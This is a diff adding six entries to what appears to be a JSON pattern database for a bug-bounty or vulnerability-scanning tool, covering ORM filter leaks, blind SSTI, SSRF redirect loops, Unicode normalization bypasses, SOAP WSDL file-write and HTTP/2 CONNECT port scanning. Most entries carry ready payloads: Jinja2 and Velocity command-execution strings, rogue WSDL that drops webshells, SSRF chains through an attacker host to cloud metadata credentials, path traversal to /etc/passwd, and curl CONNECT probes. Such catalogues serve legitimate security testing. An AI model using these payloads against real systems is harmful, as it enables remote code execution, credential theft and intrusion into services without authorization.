@@ -1,6 +1,6 @@
 {
   "_meta": {
-    "version": "1.20",
+    "version": "1.4",
     "created": "2025-01-01",
     "last_updated": "2026-05-10",
     "sources": [
@@ -10,7 +10,7 @@
       "BSidesLV 2023-2025",
       "HackerOne Hacktivity top reports"
     ],
-    "total_patterns": 43
+    "total_patterns": 49
   },
   "vulnerabilities": [
     {
@@ -1062,7 +1062,15 @@
         "//escape.tech/blog/graphql-security-wordlist/",
         "//github.com/Escape-Technologies/graphql-wordlist",
         "//web.archive.org/web/20190825033521/https",
-        "//github.com/doyensec/GQLSpection"
+        "//github.com/doyensec/GQLSpection",
+        "//web.archive.org/web/20230919211552/https",
+        "//github.com/mchoji/clairvoyancex",
+        "//web.archive.org/web/20250514221852/https",
+        "//labs.detectify.com/2018/03/14/graphql-abuse/",
+        "//github.com/nicholasaleks/graphql-threat-matrix",
+        "//web.archive.org/web/20180731231915/https",
+        "//github.com/doyensec/inql",
+        "//github.com/dolevf/graphw00f"
       ],
       "trigger_techs": [
         "GraphQL",
@@ -2326,6 +2334,385 @@
         "https://blog.compass-security.com/2017/12/postmessage-security-in-chrome-extensions/"
       ],
       "severity": "high"
+    },
+    {
+      "id": "ORM_LEAK",
+      "name": "ORM Leak — filter abuse on Django/Prisma/Beego/EF/OData",
+      "h1_frequency": "medium",
+      "h1_avg_bounty_usd": 2500,
+      "h1_top_reports": [
+        "Django REST Framework filter param leaks user.password__icontains hash via response-length oracle (estimated $3000+)",
+        "Prisma findMany {resetToken:{not:null}} authentication bypass on Node API (estimated $2500)",
+        "OData $filter=CreatedBy/Password gt 'a' boolean exfil on enterprise SaaS (estimated $4000)"
+      ],
+      "trigger_paths": [
+        "/api/users",
+        "/api/articles",
+        "/api/search",
+        "/odata/",
+        "/v1/",
+        "/v2/"
+      ],
+      "trigger_params": [
+        "q",
+        "filter",
+        "where",
+        "$filter",
+        "search",
+        "query",
+        "resetToken",
+        "password"
+      ],
+      "trigger_techs": [
+        "Django",
+        "Ruby on Rails",
+        "Express",
+        "Prisma",
+        "Beego",
+        "Entity Framework",
+        "ASP.NET Core",
+        "FastAPI"
+      ],
+      "trigger_response_hints": [
+        "FieldError",
+        "Unsupported lookup",
+        "PrismaClientValidationError",
+        "Argument .* unknown",
+        "EntityFramework",
+        "ODataQueryOptions"
+      ],
+      "payloads": [
+        "?q=password__icontains=a (Django relational lookup pivot)",
+        "?q=created_by__user__password__contains=admin (Django join pivot)",
+        "?q=email__password=~attacker (Beego operator confusion)",
+        "{\"resetToken\":{\"not\":null}} (Prisma auth bypass JSON)",
+        "?resetToken[not]=E (URL-encoded extended parser)",
+        "Cookie: session=j:{\"isAdmin\":{\"not\":false}} (ExpressJS json cookies)",
+        "?$filter=CreatedBy/Password gt 'a' (OData boolean exfil)",
+        "?q=password__regex=^a (ReDoS timing oracle)"
+      ],
+      "nuclei_tags": [
+        "orm",
+        "django",
+        "prisma",
+        "odata",
+        "injection"
+      ],
+      "references": [
+        "https://elttam.com/blog/leaking-more-than-you-joined-for/",
+        "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+      ],
+      "severity": "high",
+      "discovered_date": "2026-02-05",
+      "source": "https://elttam.com/blog/leaking-more-than-you-joined-for/"
+    },
+    {
+      "id": "SSTI_BLIND_ERROR",
+      "name": "Blind SSTI exploitation via error-based and boolean techniques",
+      "h1_frequency": "low",
+      "h1_avg_bounty_usd": 5000,
+      "h1_top_reports": [
+        "Jinja2 error-based RCE on report rendering endpoint (estimated $7500)",
+        "Twig boolean-blind SSTI via 1/0 conditional in invoice generator (estimated $5000)",
+        "Velocity error-based on email template config — auth bypass + RCE (estimated $4500)"
+      ],
+      "trigger_paths": [
+        "/render",
+        "/preview",
+        "/template",
+        "/email/preview",
+        "/report"
+      ],
+      "trigger_params": [
+        "template",
+        "name",
+        "subject",
+        "body",
+        "format",
+        "msg"
+      ],
+      "trigger_techs": [
+        "Jinja2",
+        "Twig",
+        "Velocity",
+        "Freemarker",
+        "Smarty",
+        "Handlebars",
+        "Mako",
+        "Pug"
+      ],
+      "trigger_response_hints": [
+        "TemplateSyntaxError",
+        "UndefinedError",
+        "VelocityException",
+        "FreeMarkerTemplateException",
+        "TwigError",
+        "ParseException at line"
+      ],
+      "payloads": [
+        "Error-based Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()/0}} → ZeroDivisionError leaks output in stack trace",
+        "Boolean blind: {%if 7*7==49%}1{%else%}1/0{%endif%} → 200 vs 500 oracle",
+        "Twig error: {{['id']|map(_self.parent)|first}} forces Twig_Error with reflected value",
+        "Velocity error-based: #set($x=$class.inspect('java.lang.Runtime').type.getMethod('exec',$class.inspect('java.lang.String').type).invoke(null,'id')) #if($x.toString().contains('uid'))A#{end}",
+        "Polyglot detection: ${{<%[%'\"}}%\\."
+      ],
+      "nuclei_tags": [
+        "ssti",
+        "jinja2",
+        "twig",
+        "velocity",
+        "freemarker",
+        "blind"
+      ],
+      "references": [
+        "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025",
+        "https://github.com/vladko312/SSTImap"
+      ],
+      "severity": "critical",
+      "discovered_date": "2026-02-05",
+      "source": "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+    },
+    {
+      "id": "SSRF_REDIRECT_LOOP_LEAK",
+      "name": "Blind SSRF made visible via incrementing 3xx redirect loops",
+      "h1_frequency": "low",
+      "h1_avg_bounty_usd": 8000,
+      "h1_top_reports": [
+        "Enterprise integration platform — blind SSRF leaks IMDS via 305→310 redirect chain (estimated $10000)",
+        "PDF rendering microservice — full response chain leaked when libcurl exceeds redirect threshold (estimated $7500)"
+      ],
+      "trigger_paths": [
+        "/api/url",
+        "/api/fetch",
+        "/proxy",
+        "/import",
+        "/preview",
+        "/screenshot",
+        "/webhook",
+        "/avatar"
+      ],
+      "trigger_params": [
+        "url",
+        "uri",
+        "src",
+        "callback",
+        "image_url",
+        "redirect",
+        "target"
+      ],
+      "trigger_techs": [
+        "libcurl",
+        "Node.js",
+        "Python requests",
+        "Go net/http",
+        "any HTTP fetch primitive"
+      ],
+      "trigger_response_hints": [
+        "JSON parsing error",
+        "NetworkException",
+        "Too many redirects",
+        "CURLE_TOO_MANY_REDIRECTS",
+        "max redirects exceeded"
+      ],
+      "payloads": [
+        "Set up attacker server that returns Location: <next> with status code 305, then 306, then 307, …, then 310, finally 200 to internal URL like http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "Single chain: target?url=https://evil/redir/305 → /306 → /307 → /308 → /309 → /310 → http://localhost:8500/v1/agent/self",
+        "Combine with case-mutated schemes: hTtp://evil/, gopher://evil/ to trigger different code paths"
+      ],
+      "nuclei_tags": [
+        "ssrf",
+        "redirect",
+        "blind",
+        "metadata"
+      ],
+      "references": [
+        "https://slcyber.io/research-center/novel-ssrf-technique-involving-http-redirect-loops/",
+        "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+      ],
+      "severity": "critical",
+      "discovered_date": "2025-09-15",
+      "source": "https://slcyber.io/research-center/novel-ssrf-technique-involving-http-redirect-loops/"
+    },
+    {
+      "id": "UNICODE_NORMALIZATION_BYPASS",
+      "name": "Unicode normalization — confusables, overlong, truncation, case-fold bypass",
+      "h1_frequency": "medium",
+      "h1_avg_bounty_usd": 3000,
+      "h1_top_reports": [
+        "Account takeover via Unicode confusable in email change (admin@target → admın@target with U+0131) ($5000)",
+        "WAF bypass on SQLi using fullwidth chars (U+FF07 instead of ') ($3500)",
+        "Path traversal bypass using overlong UTF-8 encodings (%c0%ae%c0%ae/) ($4000)"
+      ],
+      "trigger_paths": [
+        "/login",
+        "/register",
+        "/change-email",
+        "/reset",
+        "/upload",
+        "/api/users",
+        "/files"
+      ],
+      "trigger_params": [
+        "email",
+        "username",
+        "name",
+        "filename",
+        "path",
+        "search",
+        "q"
+      ],
+      "trigger_techs": [
+        ".NET",
+        "Java",
+        "Python",
+        "PHP",
+        "Node.js",
+        "Cloudflare",
+        "Akamai",
+        "AWS WAF",
+        "Imperva"
+      ],
+      "trigger_response_hints": [
+        "200 OK on payload that is normally blocked",
+        "Different response for ASCII vs Unicode equivalent",
+        "Reflected payload showing post-normalization form"
+      ],
+      "payloads": [
+        "Confusable chars: ı (U+0131) for i, ѕ (U+0455) for s, а (U+0430) for a — 'admın' bypasses 'admin' blocklist but normalizes back",
+        "Fullwidth: ＜script＞alert(1)＜/script＞ (U+FF1C/U+FF1E)",
+        "Overlong UTF-8: %c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd (encoded . and /)",
+        "Compatibility chars: ﬁ (U+FB01) → fi after NFKC normalization",
+        "Special-K polyglot: \\u017f → ʼ → ' after case fold + normalization",
+        "Case-folding: ß → SS after String.toUpperCase() on Java"
+      ],
+      "nuclei_tags": [
+        "unicode",
+        "normalization",
+        "waf-bypass",
+        "confusable"
+      ],
+      "references": [
+        "https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/",
+        "https://slcyber.io/research-center/abusing-windows-net-quirks-and-unicode-normalization-to-exploit-dnn-dotnetnuke/",
+        "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+      ],
+      "severity": "high",
+      "discovered_date": "2025-08-10",
+      "source": "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+    },
+    {
+      "id": "SOAP_WSDL_FILE_WRITE_RCE",
+      "name": "SOAPwn — .NET SoapHttpClientProtocol WSDL file:// abuse → arbitrary write / RCE",
+      "h1_frequency": "low",
+      "h1_avg_bounty_usd": 12000,
+      "h1_top_reports": [
+        "Barracuda Service Center RMM unauth RCE via rogue WSDL → ASPX webshell drop ($15000+)",
+        "Ivanti Endpoint Manager — SOAP client coerced into writing CSHTML to wwwroot (estimated $20000)",
+        "Microsoft SSIS package execution via attacker-supplied WSDL (estimated $10000)"
+      ],
+      "trigger_paths": [
+        "/Service.asmx",
+        "/wsdl",
+        "/SoapService",
+        "/api/soap",
+        "/ConfigService"
+      ],
+      "trigger_params": [
+        "wsdl",
+        "wsdlUrl",
+        "service",
+        "endpoint",
+        "url",
+        "address"
+      ],
+      "trigger_techs": [
+        ".NET Framework",
+        "ASP.NET",
+        "Microsoft IIS",
+        "WCF",
+        "Umbraco",
+        "Barracuda",
+        "Ivanti",
+        "Microsoft PowerShell",
+        "SSIS"
+      ],
+      "trigger_response_hints": [
+        "<wsdl:definitions",
+        "SoapHttpClientProtocol",
+        "HttpWebClientProtocol",
+        "ServiceDescriptionImporter",
+        "soap:address",
+        "FileWebRequest"
+      ],
+      "payloads": [
+        "Rogue WSDL: <wsdl:service><wsdl:port><soap:address location=\"file://C:/inetpub/wwwroot/shell.aspx\"/></wsdl:port></wsdl:service>",
+        "SOAP body containing ASPX webshell content — gets written verbatim to file:// path",
+        "POST /endpoint?wsdl=https://attacker/evil.wsdl  → application calls ServiceDescriptionImporter on attacker WSDL → file:// proxy generated → SOAP method writes attacker body to disk",
+        "Drop CSHTML: <wsdl:port><soap:address location=\"file:///var/www/html/shell.cshtml\"/></wsdl:port>"
+      ],
+      "nuclei_tags": [
+        "soap",
+        "wsdl",
+        "dotnet",
+        "rce",
+        "file-upload"
+      ],
+      "references": [
+        "https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/",
+        "https://thehackernews.com/2025/12/net-soapwn-flaw-opens-door-for-file.html"
+      ],
+      "severity": "critical",
+      "discovered_date": "2025-12-10",
+      "source": "https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/"
+    },
+    {
+      "id": "HTTP2_CONNECT_INTERNAL_PORTSCAN",
+      "name": "HTTP/2 CONNECT internal port-scanning via misconfigured proxies",
+      "h1_frequency": "low",
+      "h1_avg_bounty_usd": 4500,
+      "h1_top_reports": [
+        "CDN-fronted asset proxy — HTTP/2 CONNECT to 127.0.0.1:* enables internal recon ($6000)",
+        "API gateway forwards :method CONNECT to backend → SSRF-equivalent into VPC ($5000)"
+      ],
+      "trigger_paths": [
+        "/",
+        "/api/",
+        "/proxy"
+      ],
+      "trigger_params": [],
+      "trigger_techs": [
+        "Nginx",
+        "Envoy",
+        "HAProxy",
+        "Cloudflare",
+        "AWS CloudFront",
+        "Akamai",
+        "Apache HTTPd"
+      ],
+      "trigger_response_hints": [
+        "HTTP/2 200 on CONNECT-method response",
+        ":status 200 via h2c",
+        "Different timing for open vs closed ports"
+      ],
+      "payloads": [
+        "curl --http2-prior-knowledge -X CONNECT https://target -H ':authority: 127.0.0.1:6379'",
+        "nghttp2 client: send :method CONNECT :authority 169.254.169.254:80 → AWS metadata via proxy",
+        "Iterate ports 22,80,443,3306,5432,6379,8080,8500,9200 to enumerate internal services and time the responses (open vs filtered)"
+      ],
+      "nuclei_tags": [
+        "http2",
+        "connect",
+        "ssrf",
+        "portscan",
+        "proxy"
+      ],
+      "references": [
+        "https://blog.flomb.net/posts/http2connect/",
+        "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+      ],
+      "severity": "high",
+      "discovered_date": "2025-10-20",
+      "source": "https://blog.flomb.net/posts/http2connect/"
     }
   ]
 }
